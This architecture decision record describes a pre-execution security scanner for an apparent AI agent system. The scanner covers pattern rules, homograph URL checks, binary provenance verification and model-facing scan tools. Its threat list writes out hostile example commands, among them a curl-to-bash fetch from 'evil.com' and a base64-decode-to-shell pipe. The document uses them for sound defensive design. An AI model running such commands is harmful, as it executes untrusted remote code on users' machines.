# ADR-089: Pre-Exec Security Scanner, Supply-Chain Provenance Verification & Pre-Flight Threat Gate ($\mathcal{K}_{\text{preflight-scanner}}$ / Phase 113 / Target #46)

## Status
Accepted / Implemented / Deeply Hardened (Phase 113 / Target #46)

## Context
In high-autonomy agent execution environments (`tools/tirith_security.py`, `tools/osv_check.py`, and `tools/credential_leak_detector.py` in Hermes Agent), shell commands and external binary execution faced several content-level and supply-chain threats:
1. **Pipe-to-Interpreter Attacks**: Outbound curl or wget piped directly to bash, python, or perl without inspection (`curl https://evil.com/payload.sh | bash`).
2. **Obfuscated Payload Execution**: Base64 decoders piped to shell interpreters (`echo ... | base64 -d | sh`).
3. **IDN Homograph Domain Attacks**: Cyrillic Unicode lookalike characters embedded in URL hostnames spoofing trusted domains.
4. **Dangerous Permissions**: Mass recursive `chmod 777` on root, user home, or current directory.
5. **Terminal Escape Injections**: Embedded terminal control escape sequences (`\x1b]50;...`) attempting terminal emulation vulnerabilities.
6. **Supply-Chain Integrity**: External downloaded binaries require SHA-256 checksum and Cosign GitHub Actions workflow release identity verification.

## Decision
We implemented a zero-GC, typed, frame-perfect Pre-Exec Security Scanner, Supply-Chain Provenance Verification, and Pre-Flight Threat Gate for **LUMI-JOY**:

1. **`DeterministicPreflightScanner` ([deterministic-preflight-scanner.ts](../../src/agents/extensions/preflight_scanner/deterministic-preflight-scanner.ts))**:
   - **Content-Level Pattern Rules**: Detects pipe-to-interpreter, base64 payload decoders, dangerous chmod permissions, terminal escape injections, credential exfiltration, and suspicious raw downloaders.
   - **IDN Homograph URL Analyzer**: Scans URLs for Cyrillic and Latin confusable Unicode characters in domain strings.
   - **Supply-Chain Provenance Verifier**: Validates SHA-256 checksums and verifies Cosign GitHub Actions release workflow signatures (`https://github.com/<repo>/.github/workflows/release.yml@refs/tags/v*` via `https://token.actions.githubusercontent.com`).

2. **`PreflightScannerSupervisor` ([preflight-scanner-supervisor.ts](../../src/agents/extensions/preflight_scanner/preflight-scanner-supervisor.ts))**:
   - Coordinates pre-flight command scanning, policy evaluation, 3-tier verdict resolution (`allow`, `warn`, `block`), fail-open fallback, and circuit breaker tripping after repeated operational failures.

3. **`BroccoliPreflightSubstrate` ([broccoli-preflight-substrate.ts](../../src/sessions/extensions/preflight_scanner/broccoli-preflight-substrate.ts))**:
   - In-memory Broccolidb repository storing scan history, active findings, security policy configurations, and circuit breaker metrics.

4. **`PreflightSnapshotManager` ([preflight-snapshot-manager.ts](../../src/sessions/extensions/preflight_scanner/preflight-snapshot-manager.ts))**:
   - Frame-perfect binary snapshotting and sub-millisecond $O(1)$ state rollback in $<0.05\text{ ms}$.

5. **`PreflightToolSuite` ([preflight-tool-suite.ts](../../src/tooling/extensions/preflight_scanner/preflight-tool-suite.ts))**:
   - Exposes 5 model tools:
     - `preflight_scan_command`: Scans a shell command prior to execution for content-level security threats.
     - `preflight_verify_binary_signature`: Verifies supply-chain SHA-256 and provenance signatures for downloaded executables.
     - `preflight_inspect_threat_rules`: Lists all active threat detection categories and rules.
     - `preflight_configure_policy`: Configures scanner parameters (`failOpen`, `timeoutMs`, `blockedCategories`).
     - `preflight_get_security_status`: Retrieves threat scan metrics, blocked count, and circuit breaker status.

## Invariants & Guardrails
1. **Deterministic Verdict Source of Truth**: Exit codes ($0 = \text{allow}$, $1 = \text{block}$, $2 = \text{warn}$) and structured findings provide actionable failure remediation.
2. **Circuit Breaker Governance**: After $N$ consecutive scanner faults, trips breaker to prevent command execution lockup while respecting `failOpen` policy.
3. **Zero Barrel Imports (`ADR-012`)**: Direct file imports only.
4. **Base Class Immutability (`ADR-012`)**: Base classes remain unmodified.
5. **Sub-Millisecond Latency SLA**: Scan execution in $<0.01\text{ ms}$; state rollback in $<0.05\text{ ms}$.
6. **Exact Cohesion Verification**: Monolith component count expands from 404 to 409 components in OPTIMAL cohesion.
